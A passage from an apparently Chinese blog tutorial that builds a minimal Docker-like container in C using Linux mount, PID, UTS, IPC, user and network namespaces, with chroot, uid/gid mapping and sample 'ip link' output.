class="string">&quot;udev&quot;</span>, <span class="string">&quot;rootfs/dev&quot;</span>, <span class="string">&quot;devtmpfs&quot;</span>, <span class="number">0</span>, <span class="literal">NULL</span>)!=<span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;dev&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (mount(<span class="string">&quot;devpts&quot;</span>, <span class="string">&quot;rootfs/dev/pts&quot;</span>, <span class="string">&quot;devpts&quot;</span>, <span class="number">0</span>, <span class="literal">NULL</span>)!=<span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;dev/pts&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (mount(<span class="string">&quot;shm&quot;</span>, <span class="string">&quot;rootfs/dev/shm&quot;</span>, <span class="string">&quot;tmpfs&quot;</span>, <span class="number">0</span>, <span class="literal">NULL</span>)!=<span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;dev/shm&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (mount(<span class="string">&quot;tmpfs&quot;</span>, <span class="string">&quot;rootfs/run&quot;</span>, <span class="string">&quot;tmpfs&quot;</span>, <span class="number">0</span>, <span class="literal">NULL</span>)!=<span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;run&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * 模仿Docker的从外向容器里mount相关的配置文件</span></span><br><span class="line"><span class="comment">     * 你可以查看：/var/lib/docker/containers/&lt;container_id&gt;/目录，</span></span><br><span class="line"><span class="comment">     * 你会看到docker的这些文件的。</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">if</span> (mount(<span class="string">&quot;conf/hosts&quot;</span>, <span class="string">&quot;rootfs/etc/hosts&quot;</span>, <span class="string">&quot;none&quot;</span>, MS_BIND, <span class="literal">NULL</span>)!=<span class="number">0</span> ||</span><br><span class="line">          mount(<span class="string">&quot;conf/hostname&quot;</span>, <span class="string">&quot;rootfs/etc/hostname&quot;</span>, <span class="string">&quot;none&quot;</span>, MS_BIND, <span class="literal">NULL</span>)!=<span class="number">0</span> ||</span><br><span class="line">          mount(<span class="string">&quot;conf/resolv.conf&quot;</span>, <span class="string">&quot;rootfs/etc/resolv.conf&quot;</span>, <span class="string">&quot;none&quot;</span>, MS_BIND, <span class="literal">NULL</span>)!=<span class="number">0</span> ) &#123;</span><br><span class="line">        perror(<span class="string">&quot;conf&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* chroot 隔离目录 */</span></span><br><span class="line">    <span class="keyword">if</span> ( chdir(<span class="string">&quot;./rootfs&quot;</span>) != <span class="number">0</span> || chroot(<span class="string">&quot;./&quot;</span>) != <span class="number">0</span> )&#123;</span><br><span class="line">        perror(<span class="string">&quot;chdir/chroot&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    execv(container_args[<span class="number">0</span>], container_args);</span><br><span class="line">    perror(<span class="string">&quot;exec&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Something&#x27;s wrong!\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Parent [%5d] - start a container!\n&quot;</span>, getpid());</span><br><span class="line">    <span class="keyword">int</span> container_pid = clone(container_main, container_stack+STACK_SIZE,</span><br><span class="line">            CLONE_NEWUTS | CLONE_NEWIPC | CLONE_NEWPID | CLONE_NEWNS | SIGCHLD, <span class="literal">NULL</span>);</span><br><span class="line">    waitpid(container_pid, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Parent - container stopped!\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>做了主机、进程、进程间通信、文件系统(包含 /dev /proc/sys /run /tmp 目录)隔离的代码</p><p>运行后悔挂在设备文件至 rootfs/dev 等目录，想要删除 rootfs 需要 <code>umount -R rootfs/dev rootfs/proc rootfs/sys rootfs/run rootfs/tmp rootfs/etc/*</code> 一下</p><h3 id="User-Namespace"><a href="#User-Namespace" class="headerlink" title="User Namespace"></a>User Namespace</h3><p>可通过 clone() 函数设置 <code>CLONE_NEWUSER</code> 标志位实现，但不需要 root 权限，通过普通用户运行，安全系数更高，就算被逃逸了也是一个普通用户权限</p><p><code>sys/capability.h</code>头文件需要安装依赖</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt install libcap-dev</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mount.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/capability.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> STACK_SIZE (1024 * 1024)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">char</span> container_stack[STACK_SIZE];</span><br><span class="line"><span class="keyword">char</span>* <span class="keyword">const</span> container_args[] = &#123;</span><br><span class="line">    <span class="string">&quot;/bin/bash&quot;</span>,</span><br><span class="line">    <span class="literal">NULL</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> pipefd[<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">set_map</span><span class="params">(<span class="keyword">char</span>* file, <span class="keyword">int</span> inside_id, <span class="keyword">int</span> outside_id, <span class="keyword">int</span> len)</span> </span>&#123;</span><br><span class="line">    FILE* mapfd = fopen(file, <span class="string">&quot;w&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="literal">NULL</span> == mapfd) &#123;</span><br><span class="line">        perror(<span class="string">&quot;open file error&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">fprintf</span>(mapfd, <span class="string">&quot;%d %d %d&quot;</span>, inside_id, outside_id, len);</span><br><span class="line">    fclose(mapfd);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">set_uid_map</span><span class="params">(<span class="keyword">pid_t</span> pid, <span class="keyword">int</span> inside_id, <span class="keyword">int</span> outside_id, <span class="keyword">int</span> len)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> file[<span class="number">256</span>];</span><br><span class="line">    <span class="built_in">sprintf</span>(file, <span class="string">&quot;/proc/%d/uid_map&quot;</span>, pid);</span><br><span class="line">    set_map(file, inside_id, outside_id, len);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">set_gid_map</span><span class="params">(<span class="keyword">pid_t</span> pid, <span class="keyword">int</span> inside_id, <span class="keyword">int</span> outside_id, <span class="keyword">int</span> len)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> file[<span class="number">256</span>];</span><br><span class="line">    <span class="built_in">sprintf</span>(file, <span class="string">&quot;/proc/%d/gid_map&quot;</span>, pid);</span><br><span class="line">    set_map(file, inside_id, outside_id, len);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">container_main</span><span class="params">(<span class="keyword">void</span>* arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Container [%5d] - inside the container!\n&quot;</span>, getpid());</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Container: eUID = %ld;  eGID = %ld, UID=%ld, GID=%ld\n&quot;</span>,</span><br><span class="line">            (<span class="keyword">long</span>) geteuid(), (<span class="keyword">long</span>) getegid(), (<span class="keyword">long</span>) getuid(), (<span class="keyword">long</span>) getgid());</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 等待父进程通知后再往下执行（进程间的同步） */</span></span><br><span class="line">    <span class="keyword">char</span> ch;</span><br><span class="line">    close(pipefd[<span class="number">1</span>]);</span><br><span class="line">    read(pipefd[<span class="number">0</span>], &amp;ch, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Container [%5d] - setup hostname!\n&quot;</span>, getpid());</span><br><span class="line">    <span class="comment">//set hostname</span></span><br><span class="line">    sethostname(<span class="string">&quot;container&quot;</span>,<span class="number">10</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//remount &quot;/proc&quot; to make sure the &quot;top&quot; and &quot;ps&quot; show container&#x27;s information</span></span><br><span class="line">    mount(<span class="string">&quot;proc&quot;</span>, <span class="string">&quot;/proc&quot;</span>, <span class="string">&quot;proc&quot;</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    execv(container_args[<span class="number">0</span>], container_args);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Something&#x27;s wrong!\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">int</span> gid=getgid(), uid=getuid();</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Parent: eUID = %ld;  eGID = %ld, UID=%ld, GID=%ld\n&quot;</span>,</span><br><span class="line">            (<span class="keyword">long</span>) geteuid(), (<span class="keyword">long</span>) getegid(), (<span class="keyword">long</span>) getuid(), (<span class="keyword">long</span>) getgid());</span><br><span class="line"></span><br><span class="line">    pipe(pipefd);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Parent [%5d] - start a container!\n&quot;</span>, getpid());</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> container_pid = clone(container_main, container_stack+STACK_SIZE, </span><br><span class="line">            CLONE_NEWUTS | CLONE_NEWPID | CLONE_NEWNS | CLONE_NEWUSER | SIGCHLD, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Parent [%5d] - Container [%5d]!\n&quot;</span>, getpid(), container_pid);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//To map the uid/gid, </span></span><br><span class="line">    <span class="comment">//   we need edit the /proc/PID/uid_map (or /proc/PID/gid_map) in parent</span></span><br><span class="line">    <span class="comment">//The file format is</span></span><br><span class="line">    <span class="comment">//   ID-inside-ns   ID-outside-ns   length</span></span><br><span class="line">    <span class="comment">//if no mapping, </span></span><br><span class="line">    <span class="comment">//   the uid will be taken from /proc/sys/kernel/overflowuid</span></span><br><span class="line">    <span class="comment">//   the gid will be taken from /proc/sys/kernel/overflowgid</span></span><br><span class="line">    set_uid_map(container_pid, <span class="number">0</span>, uid, <span class="number">1</span>);</span><br><span class="line">    set_gid_map(container_pid, <span class="number">0</span>, gid, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Parent [%5d] - user/group mapping done!\n&quot;</span>, getpid());</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 通知子进程 */</span></span><br><span class="line">    close(pipefd[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">    waitpid(container_pid, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Parent - container stopped!\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>写入/proc/<pid>/uid_map(gid_map)文件的进程需要这个namespace中的CAP_SETUID (CAP_SETGID)权限，写入的进程必须是此user namespace的父或子的user namespace进程<br>我这编译了 gid 映射文件没成功写入，原因可参考 <a href="https://man7.org/linux/man-pages/man7/user_namespaces.7.html">https://man7.org/linux/man-pages/man7/user_namespaces.7.html</a></p><blockquote><p>/*<br>Linux 3.19 made a change in the handling of setgroups(2) and the<br>‘gid_map’ file to address a security issue. The issue allowed<br><em>unprivileged</em> users to employ user namespaces in order to drop<br>The upshot of the 3.19 changes is that in order to update the<br>‘gid_maps’ file, use of the setgroups() system call in this<br>user namespace must first be disabled by writing “deny” to one of<br>the /proc/PID/setgroups files for this namespace. That is the<br>purpose of the following function.<br>*/</p></blockquote><p>其实上述代码还涉及进程间同步问题，即有管道代码位置有点问题，有时会出现还未修改 /proc/<pid>/uid_map(gid_map) 就已经获取了容器内的 uid 和 gid ，这里通过另外一种方式实现，解决进程同步问题，顺便设置了 setgroups</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mount.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span>* <span class="keyword">const</span> container_args[] = &#123;</span><br><span class="line">    <span class="string">&quot;/usr/bin/sh&quot;</span>,</span><br><span class="line">    <span class="literal">NULL</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">char</span>* <span class="keyword">const</span> container_envp[] = &#123;</span><br><span class="line">    <span class="string">&quot;PATH=/usr/bin&quot;</span>,</span><br><span class="line">    <span class="string">&quot;TERM=console&quot;</span>,</span><br><span class="line">    <span class="string">&quot;HOME=/root&quot;</span>,</span><br><span class="line">    <span class="literal">NULL</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">set_groups</span><span class="params">(<span class="keyword">char</span>* file, <span class="keyword">char</span>* value)</span> </span>&#123;</span><br><span class="line">    FILE* groupfd = fopen(file, <span class="string">&quot;w&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="literal">NULL</span> == groupfd) &#123;</span><br><span class="line">        perror(<span class="string">&quot;open file error&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">fprintf</span>(groupfd, <span class="string">&quot;%s&quot;</span>, value);</span><br><span class="line">    fclose(groupfd);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">set_map</span><span class="params">(<span class="keyword">char</span>* file, <span class="keyword">int</span> inside_id, <span class="keyword">int</span> outside_id, <span class="keyword">int</span> len)</span> </span>&#123;</span><br><span class="line">    FILE* mapfd = fopen(file, <span class="string">&quot;w&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="literal">NULL</span> == mapfd) &#123;</span><br><span class="line">        perror(<span class="string">&quot;open file error&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">fprintf</span>(mapfd, <span class="string">&quot;%d %d %d&quot;</span>, inside_id, outside_id, len);</span><br><span class="line">    fclose(mapfd);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">container_main</span><span class="params">(<span class="keyword">void</span>* arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Container [%5d] - inside the container!\n&quot;</span>, getpid());</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Container: eUID = %ld; eGID = %ld, UID=%ld, GID=%ld\n&quot;</span>,</span><br><span class="line">    (<span class="keyword">long</span>) geteuid(), (<span class="keyword">long</span>) getegid(), (<span class="keyword">long</span>) getuid(), (<span class="keyword">long</span>) getgid());</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Container [%5d] - setup hostname!\n&quot;</span>, getpid());</span><br><span class="line">    <span class="comment">//set hostname</span></span><br><span class="line">    sethostname(<span class="string">&quot;container&quot;</span>,<span class="number">10</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//set root directory</span></span><br><span class="line">    chroot(<span class="string">&quot;rootfs&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//change to `/`</span></span><br><span class="line">    chdir(<span class="string">&quot;/&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//remount &quot;/proc&quot; to make sure the &quot;top&quot; and &quot;ps&quot; show container&#x27;s information</span></span><br><span class="line">    mount(<span class="string">&quot;proc&quot;</span>, <span class="string">&quot;/proc&quot;</span>, <span class="string">&quot;proc&quot;</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    execvpe(container_args[<span class="number">0</span>], container_args, container_envp);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Something&#x27;s wrong!\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">int</span> gid=getegid(), uid=geteuid();</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Parent: eUID = %ld; eGID = %ld, UID=%ld, GID=%ld\n&quot;</span>,</span><br><span class="line">    (<span class="keyword">long</span>) geteuid(), (<span class="keyword">long</span>) getegid(), (<span class="keyword">long</span>) getuid(), (<span class="keyword">long</span>) getgid());</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Parent [%5d] - start a container!\n&quot;</span>, getpid());</span><br><span class="line"></span><br><span class="line">    unshare(CLONE_NEWUTS | CLONE_NEWPID | CLONE_NEWNS | CLONE_NEWUSER | CLONE_NEWNET);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">pid_t</span> container_pid = fork();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!container_pid) &#123;</span><br><span class="line">        <span class="comment">/* since Linux 3.19 unprivileged writing of /proc/self/gid_map</span></span><br><span class="line"><span class="comment">        * has s been disabled unless /proc/self/setgroups is written</span></span><br><span class="line"><span class="comment">        * first to permanently disable the ability to call setgroups</span></span><br><span class="line"><span class="comment">        * in that user namespace. */</span></span><br><span class="line">        set_groups(<span class="string">&quot;/proc/self/setgroups&quot;</span>, <span class="string">&quot;deny&quot;</span>);</span><br><span class="line">        <span class="comment">//To map the uid/gid,</span></span><br><span class="line">        <span class="comment">// we need edit the /proc/PID/uid_map (or /proc/PID/gid_map) in parent</span></span><br><span class="line">        <span class="comment">//The file format is</span></span><br><span class="line">        <span class="comment">// ID-inside-ns ID-outside-ns length</span></span><br><span class="line">        <span class="comment">//if no mapping,</span></span><br><span class="line">        <span class="comment">// the uid will be taken from /proc/sys/kernel/overflowuid</span></span><br><span class="line">        <span class="comment">// the gid will be taken from /proc/sys/kernel/overflowgid</span></span><br><span class="line">        set_map(<span class="string">&quot;/proc/self/uid_map&quot;</span>, <span class="number">0</span>, uid, <span class="number">1</span>);</span><br><span class="line">        set_map(<span class="string">&quot;/proc/self/gid_map&quot;</span>, <span class="number">0</span>, gid, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> container_main(<span class="literal">NULL</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Parent [%5d] - Container [%5d]!\n&quot;</span>, getpid(), container_pid);</span><br><span class="line"></span><br><span class="line">    waitpid(container_pid, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Parent [%5d] - container stopped!\n&quot;</span>, getpid());</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>看了下这部分代码，发现和 Docker 的 nsexec.c 有几分相像</p><p>或者还有些疑问，因为这个是非 root 权限就可以设置的标志位，对于需要 root 权限的标志位，一般用户先创建User Namespace，然后把这个用户映射成root，在容器内用root来创建其它的Namesapce</p><h3 id="Network-Namespace"><a href="#Network-Namespace" class="headerlink" title="Network Namespace"></a>Network Namespace</h3><p>与上面几种Namespace一样，通过设置标志位 <code>CLONE_NEWNET</code> 即可实现网络隔离，比如 nc 监听 80 端口，并不会占用宿主机的端口</p><p>到这里，需要隔离的已经隔离的差不多了，为了更加直观的演示，下面通过命令模仿Docker中的网络命名空间</p><p>Docker 在宿主机上的网络示意图</p><p><img src="/img/linux-namespace/fedf67449ac0090f1845503f7a40e6526649a5d5.png" class="lazyload" data-srcset="/img/linux-namespace/fedf67449ac0090f1845503f7a40e6526649a5d5.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="loading-ag-5568"></p><p>在虚拟机上查看网络情况 <code>ip link</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN mode DEFAULT group default qlen 1000</span><br><span class="line">    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00</span><br><span class="line">2: ens33: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc fq_codel state UP mode DEFAULT group default qlen 1000</span><br><span class="line">    link/ether 00:50:56:3f:89:83 brd ff:ff:ff:ff:ff:ff</span><br><span class="line">7: docker0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue state UP mode DEFAULT group default</span><br><span class="line">    link/ether 02:42:a3:2f:a2:a2 brd ff:ff:ff:ff:ff:ff</span><br><span class="line">17: 